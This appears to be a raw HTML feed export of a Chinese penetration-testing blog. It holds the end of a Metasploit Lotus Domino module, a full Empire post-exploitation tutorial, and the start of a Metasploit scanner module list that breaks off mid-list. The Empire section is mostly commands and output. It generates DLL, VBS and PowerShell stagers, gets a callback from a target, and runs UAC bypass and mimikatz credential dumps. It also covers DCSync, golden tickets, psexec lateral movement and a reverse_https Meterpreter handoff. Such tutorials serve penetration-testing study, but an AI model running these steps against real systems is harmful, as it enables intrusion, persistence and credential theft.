VHOST=#&#123;vhost&#125;&quot;,</span><br><span class="line">            :active      =&gt; true</span><br><span class="line">          )</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>将该模块复制进metasploit，出现启动载入模块，即可使用</p><p>参考链接：<a href="https://github.com/rapid7/metasploit-framework/issues/8278" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/issues/8278</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote&gt;&lt;br&gt;  最近在工作中遇到了lotus的邮件系统，但在对于lotus的研究中发现，在使用metastploit的auxiliary/scanner/lotus/lotus_domino_hashes的时候，出现了报错，在显示了第一行的用户名和密码后，就直接报错了，在查询资料了解到lotus&amp;gt;=9.0，登陆功能发生了变化，无法使用。&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="metasploit" scheme="https://www.marksec.org/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Empire学习指南</title>
    <link href="https://www.marksec.org/2018/12/06/Empire%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
    <id>https://www.marksec.org/2018/12/06/Empire学习指南/</id>
    <published>2018-12-06T08:13:00.000Z</published>
    <updated>2019-03-24T05:26:06.686Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>empire是一款基于python编写的，使用powershell进行后渗透的工具，它类似于metasploit的渗透测试框架，empire可以实现无需powershell.exe即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。目前empire的版本号为empire2.5</p></blockquote><h2 id="安装启动"><a href="#安装启动" class="headerlink" title="安装启动"></a>安装启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git    </span><br><span class="line">cd Empire/</span><br><span class="line">cd setup/</span><br><span class="line">./install.sh </span><br><span class="line">./empire</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h2><p>empire主要的只要功能模块为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(Empire) &gt; help</span><br><span class="line"></span><br><span class="line">Commands</span><br><span class="line">========</span><br><span class="line">agents            Jump to the Agents menu.                           回连靶机</span><br><span class="line">creds             Add/display credentials to/from the database.      数据库中写入的各类凭据（主要为口令一类）</span><br><span class="line">exit              Exit Empire</span><br><span class="line">help              Displays the help menu.</span><br><span class="line">interact          Interact with a particular agent.                  与现有agents进行交互</span><br><span class="line">list              Lists active agents or listeners.                  列出当前活跃的监听器或服务端</span><br><span class="line">listeners         Interact with active listeners.                    进入监听器设置接口</span><br><span class="line">load              Loads Empire modules from a non-standard folder.   加载自定义模块或其他扩展模块接口（默认为empire当前目录）</span><br><span class="line">plugin            Load a plugin file to extend Empire.               加载自定义插件或其他扩展插件</span><br><span class="line">plugins           List all available and active plugins.             列出所有载入的插件列表</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files        预混淆功能</span><br><span class="line">reload            Reload one (or all) Empire modules.                同MSFreload功能</span><br><span class="line">report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log    输出报告</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).        重置ip黑白名单、混淆项目等</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.  批量导入empire命令执行</span><br><span class="line">searchmodule      Search Empire module names/descriptions.           模块关键词搜索</span><br><span class="line">set               Set a global option (e.g. IP whitelists).          设置ip黑白名单、混淆项目等</span><br><span class="line">show              Show a global option (e.g. IP whitelists).         查看当前框架设置，也就是set默认值</span><br><span class="line">usemodule         Use an Empire module.                              使用某一模块</span><br><span class="line">usestager         Use an Empire stager.                              使用某一载荷</span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建listener</span><br><span class="line">启用listener</span><br><span class="line">使用launcher启动一个powershell</span><br><span class="line">在目标靶机上执行代码</span><br><span class="line">与代理交互</span><br><span class="line">执行多种模块</span><br><span class="line">绕过UAC来获取admin权限</span><br></pre></td></tr></table></figure><p>首先输入listener进入listener交互模式，然后输入uselistener+空格再按tab键就可以使用你想生成的连接方式，然后再进行监听的基本设置就可以完成了。当我们想删除直接使用kill+Name就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(Empire) &gt; listeners</span><br><span class="line">(Empire: listeners) &gt; uselistener </span><br><span class="line">dbx           http_com      http_hop      meterpreter   redirector</span><br><span class="line">http          http_foreign  http_mapi     onedrive </span><br><span class="line">(Empire: listeners) &gt; uselistener http   //设置为http</span><br><span class="line">(Empire: listeners/http) &gt; info          //查看设置详情</span><br><span class="line">(Empire: listeners/http) &gt; set Name test //设置名字 </span><br><span class="line">(Empire: listeners/http) &gt; execute       //启动</span><br><span class="line">(Empire: listeners/http) &gt; back          //返回</span><br><span class="line">(Empire: listeners) &gt; list               //列出当前的监听列表</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</span><br><span class="line">  ----              ------          ----                                 ------------   --------</span><br><span class="line">  test              http            http://192.168.199.124:80            5/0.0</span><br></pre></td></tr></table></figure><p>接着我们进行木马的制作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">(Empire: listeners) &gt; usestager //列出可选择模块</span><br><span class="line">multi/bash                multi/war                 osx/dylib                 osx/macro                 windows/backdoorLnkMacro  windows/ducky             windows/launcher_sct      windows/macroless_msword</span><br><span class="line">multi/launcher            osx/applescript           osx/jar                   osx/pkg                   windows/bunny             windows/hta               windows/launcher_vbs      windows/shellcode</span><br><span class="line">multi/macro               osx/application           osx/launcher              osx/safari_launcher       windows/csharp_exe        windows/launcher_bat      windows/launcher_xml      windows/teensy</span><br><span class="line">multi/pyinstaller         osx/ducky                 osx/macho                 osx/teensy                windows/dll               windows/launcher_lnk      windows/macro </span><br><span class="line"></span><br><span class="line">dll木马：</span><br><span class="line">(Empire: listeners) &gt; usestager windows/dll</span><br><span class="line">(Empire: stager/windows/dll) &gt; info</span><br><span class="line"></span><br><span class="line">Name: DLL Launcher</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Generate a PowerPick Reflective DLL to inject with</span><br><span class="line">  stager code.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  Name             Required    Value             Description</span><br><span class="line">  ----             --------    -------           -----------</span><br><span class="line">  Listener         True                          Listener to use.</span><br><span class="line">  ProxyCreds       False       default           Proxy credentials</span><br><span class="line">                                                 ([domain\]username:password) to use for</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br><span class="line">                                                 powershell code, uses the</span><br><span class="line">                                                 ObfuscateCommand for obfuscation types.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  Proxy            False       default           Proxy to use for request (default, none,</span><br><span class="line">                                                 or other).</span><br><span class="line">  Language         True        powershell        Language of the stager to generate.</span><br><span class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</span><br><span class="line">  UserAgent        False       default           User-agent string to use for the staging</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Arch             True        x64               Architecture of the .dll to generate</span><br><span class="line">                                                 (x64 or x86).</span><br><span class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.</span><br><span class="line">                                                 Only used if Obfuscate switch is True.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  StagerRetries    False       0                 Times for the stager to retry</span><br><span class="line">                                                 connecting.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: stager/windows/dll) &gt; set Listener test</span><br><span class="line">(Empire: stager/windows/dll) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.dll</span><br><span class="line"></span><br><span class="line">powershell木马：</span><br><span class="line">(Empire: listeners) &gt; launcher powershell test //powershell只需launcher powershell+name即可</span><br><span class="line"></span><br><span class="line">launcher_vbs木马：</span><br><span class="line">(Empire: listeners) &gt; usestager windows/launcher_vbs</span><br><span class="line">(Empire: stager/windows/launcher_vbs) &gt; info</span><br><span class="line"></span><br><span class="line">Name: VBS Launcher</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Generates a .vbs launcher for Empire.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  Name             Required    Value             Description</span><br><span class="line">  ----             --------    -------           -----------</span><br><span class="line">  Listener         True                          Listener to generate stager for.</span><br><span class="line">  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,</span><br><span class="line">                                                 otherwise displayed on the screen.</span><br><span class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br><span class="line">                                                 powershell code, uses the</span><br><span class="line">                                                 ObfuscateCommand for obfuscation types.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  ObfuscateCommand False       Token\All\1,Launcher\PS\12467The Invoke-Obfuscation command to use.</span><br><span class="line">                                                 Only used if Obfuscate switch is True.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  Language         True        powershell        Language of the stager to generate.</span><br><span class="line">  ProxyCreds       False       default           Proxy credentials</span><br><span class="line">                                                 ([domain\]username:password) to use for</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  UserAgent        False       default           User-agent string to use for the staging</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Proxy            False       default           Proxy to use for request (default, none,</span><br><span class="line">                                                 or other).</span><br><span class="line">  StagerRetries    False       0                 Times for the stager to retry</span><br><span class="line">                                                 connecting.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: stager/windows/launcher_vbs) &gt; set Listener test</span><br><span class="line">(Empire: stager/windows/launcher_vbs) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.vbs</span><br></pre></td></tr></table></figure><p>我们暂时使用powershell木马进行连接实验然后进行后续模块学习，通过在目标机器上粘贴我们的powershell木马进行回连。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; agents  //列表列出当前回连的链路</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line"> Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen</span><br><span class="line"> ----     -- -----------     ------------      --------                -------            ---    -----    ---------</span><br><span class="line"> A2B7YFVG ps 192.168.199.122 WIN-6S1ISV98BNM   *TEST\Administrator     powershell         3064   5/0.0    2018-11-04 03:09:33</span><br><span class="line"> (Empire: agents) &gt; interact A2B7YFVG //连接进行该目标机进行操作，进入后可以help进行命令了解</span><br><span class="line"> (Empire: A2B7YFVG) &gt; help    //可以进行mimikatz，bypassuac等等</span><br><span class="line"></span><br><span class="line">Agent Commands</span><br><span class="line">==============</span><br><span class="line">agents            Jump to the agents menu.</span><br><span class="line">back              Go back a menu.</span><br><span class="line">bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn &lt;listener&gt;</span><br><span class="line">clear             Clear out agent tasking.</span><br><span class="line">creds             Display/return credentials from the database.</span><br><span class="line">download          Task an agent to download a file.</span><br><span class="line">exit              Task agent to exit.</span><br><span class="line">help              Displays the help menu or syntax for particular commands.</span><br><span class="line">info              Display information about this agent</span><br><span class="line">injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode &lt;meter_listener&gt; &lt;pid&gt;</span><br><span class="line">jobs              Return jobs or kill a running job.</span><br><span class="line">kill              Task an agent to kill a particular process name or ID.</span><br><span class="line">killdate          Get or set an agent&apos;s killdate (01/01/2016).</span><br><span class="line">list              Lists all active agents (or listeners).</span><br><span class="line">listeners         Jump to the listeners menu.</span><br><span class="line">lostlimit         Task an agent to change the limit on lost agent detection</span><br><span class="line">main              Go back to the main menu.</span><br><span class="line">mimikatz          Runs Invoke-Mimikatz on the client.</span><br><span class="line">psinject          Inject a launcher into a remote process. Ex. psinject &lt;listener&gt; &lt;pid/process_name&gt;</span><br><span class="line">pth               Executes PTH for a CredID through Mimikatz.</span><br><span class="line">rename            Rename the agent.</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">revtoself         Uses credentials/tokens to revert token privileges.</span><br><span class="line">sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]</span><br><span class="line">scriptcmd         Execute a function in the currently imported PowerShell script.</span><br><span class="line">scriptimport      Imports a PowerShell script and keeps it in memory in the agent.</span><br><span class="line">searchmodule      Search Empire module names/descriptions.</span><br><span class="line">shell             Task an agent to use a shell command.</span><br><span class="line">shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject &lt;listener&gt; &lt;pid&gt;</span><br><span class="line">sleep             Task an agent to &apos;sleep interval [jitter]&apos;</span><br><span class="line">spawn             Spawns a new Empire agent for the given listener name. Ex. spawn &lt;listener&gt;</span><br><span class="line">steal_token       Uses credentials/tokens to impersonate a token for a given process ID.</span><br><span class="line">sysinfo           Task an agent to get system information.</span><br><span class="line">updatecomms       Dynamically update the agent comms to another listener</span><br><span class="line">updateprofile     Update an agent connection profile.</span><br><span class="line">upload            Task an agent to upload a file.</span><br><span class="line">usemodule         Use an Empire PowerShell module.</span><br><span class="line">workinghours      Get or set an agent&apos;s working hours (9:00-17:00).</span><br></pre></td></tr></table></figure><h2 id="模块学习"><a href="#模块学习" class="headerlink" title="模块学习"></a>模块学习</h2><h3 id="检查UAC提权方法模块"><a href="#检查UAC提权方法模块" class="headerlink" title="检查UAC提权方法模块"></a>检查UAC提权方法模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: agents) &gt; interact V92TNFDK //进入目标机</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule （空格+tab键） //查看usemodule的模块，注意需要在进入到代理主机才能使用该模块,UAC提权需要是管理员组的用户才行</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule privesc/powerup/allchecks //检查提权方法模块</span><br><span class="line">(Empire: V92TNFDK) &gt; execute //执行检查</span><br></pre></td></tr></table></figure><h3 id="UAC提权模块"><a href="#UAC提权模块" class="headerlink" title="UAC提权模块"></a>UAC提权模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt; bypassuac test //执行uac提权,back之后看到带有*的用户的name,表示代理已提权过</span><br></pre></td></tr></table></figure><h3 id="域环境信息收集模块"><a href="#域环境信息收集模块" class="headerlink" title="域环境信息收集模块"></a>域环境信息收集模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt; usemodule situational_awareness/network/bloodhound //bloodhound是一个域环境收集的工具，在学习empire的时候看见它的后渗透模块也集成了该工具，以后详细介绍该工具</span><br></pre></td></tr></table></figure><h3 id="mimikatz模块"><a href="#mimikatz模块" class="headerlink" title="mimikatz模块"></a>mimikatz模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt; mimikatz  //对于后渗透工具，hash dump的工具也是必不可少的</span><br><span class="line">(Empire: V92TNFDK) &gt; creds     //列举密码 同时通过pth 也可以进行下一步令牌窃取</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line"></span><br><span class="line">  CredID  CredType   Domain                   UserName         Host             Password</span><br><span class="line">  ------  --------   ------                   --------         ----             --------</span><br><span class="line">  1       hash       test.com                 Administrator    WIN-6S1ISV98BNM  e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">  2       hash       test.com                 WIN-6S1ISV98BNM$ WIN-6S1ISV98BNM  256897bbd391086a1fea9e03a711487c</span><br><span class="line">  3       plaintext  test.com                 Administrator    WIN-6S1ISV98BNM  P@ssw0rd</span><br><span class="line">  4       hash       test.com                 WIN-6S1ISV98BNM$ WIN-6S1ISV98BNM  c8c4141f359974d60d46e5a60e0f1407</span><br></pre></td></tr></table></figure><h3 id="联动Metasploit"><a href="#联动Metasploit" class="headerlink" title="联动Metasploit"></a>联动Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">empire：</span><br><span class="line">(Empire: agents) &gt; interact V92TNFDK</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule code_execution/invoke_shellcode</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; info</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; set Lhost  10.0.0.86</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; set Lport 4433</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; execute</span><br><span class="line"></span><br><span class="line">metasploit：</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.199.122</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><h3 id="其他常用的模块"><a href="#其他常用的模块" class="headerlink" title="其他常用的模块"></a>其他常用的模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Empire: V92TNFDK) &gt;usemodule situational_awareness/network/find_localadmin_access #加载本地管理组访问模块</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule lateral_movement/invoke_psexec // psexec模块横向生成一个反弹代理</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule credentials/mimikatz/dcsync  //获取域的krbtgt值</span><br><span class="line">(Empire: V92TNFDK) &gt; usemodule credentials/mimikatz/golden_ticket //获得黄金票据</span><br><span class="line">(Empire: V92TNFDK) &gt;usemodule situational_awareness/host/computerdetails //获取系统日志</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Metasploit，Empire，Cobal strike是日常渗透中最经常使用的三大平台，对于三大平台的学习，可以使渗透工作事半功倍，在Empire之后，还有把Cobal strike的日常学习也要总结出来，有时候不经常总结就会遗忘。</p><p>本文的学习参考来自于<a href="https://xz.aliyun.com/t/67" target="_blank" rel="noopener">https://xz.aliyun.com/t/67</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;empire是一款基于python编写的，使用powershell进行后渗透的工具，它类似于metasploit的渗透测试框架，empire可以实现无需powershell.exe即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。目前empire的版本号为empire2.5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;安装启动&quot;&gt;&lt;a href=&quot;#安装启动&quot; class=&quot;headerlink&quot; title=&quot;安装启动&quot;&gt;&lt;/a&gt;安装启动&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/EmpireProject/Empire.git    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd Empire/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd setup/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./install.sh &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./empire&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="empire" scheme="https://www.marksec.org/tags/empire/"/>
    
      <category term="powershell" scheme="https://www.marksec.org/tags/powershell/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit常用模块总结</title>
    <link href="https://www.marksec.org/2018/07/06/Metasploit%E4%BD%BF%E7%94%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.marksec.org/2018/07/06/Metasploit使用小结/</id>
    <published>2018-07-06T09:55:00.000Z</published>
    <updated>2019-03-24T05:25:01.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf常用模块整理"><a href="#msf常用模块整理" class="headerlink" title="msf常用模块整理"></a>msf常用模块整理</h2><blockquote><p>主机信息收集</p></blockquote><p>使用<code>auxiliary/scanner/discovery/</code>下模块进行扫描</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">use auxiliary/scanner/discovery/empty_udp</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_multicast_ping</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_neighbor</span><br><span class="line">use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><a id="more"></a><blockquote><p>主机端口扫描</p></blockquote><p>使用<code>auxiliary/scanner/portscan/</code>下的模块探测主机端口</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack       //ACK防火墙扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce // FTP跳端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn       //SYN端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp       //TCP端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas      //TCP”XMas”端口扫描</span><br></pre></td></tr></table></figure><blockquote><p>SMB登录扫描</p></blockquote><p>使用<code>auxiliary/scanner/smb/</code>下的模块进行SMB相关操作</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/pipe_auditor</span><br><span class="line">auxiliary/scanner/smb/pipe_dcerpc_auditor    //返回DCERPC信息</span><br><span class="line">auxiliary/scanner/smb/psexec_loggedin_users  </span><br><span class="line">auxiliary/scanner/smb/smb2                   //扫描SMB2协议</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp           </span><br><span class="line">auxiliary/scanner/smb/smb_enumshares         //扫描smb共享文件</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers          //smb枚举系统用户</span><br><span class="line">auxiliary/scanner/smb/smb_enumusers_domain   </span><br><span class="line">auxiliary/scanner/smb/smb_login              //SMB登录</span><br><span class="line">auxiliary/scanner/smb/smb_lookupsid          //扫描组的用户</span><br><span class="line">auxiliary/scanner/smb/smb_uninit_cred        </span><br><span class="line">auxiliary/scanner/smb/smb_version            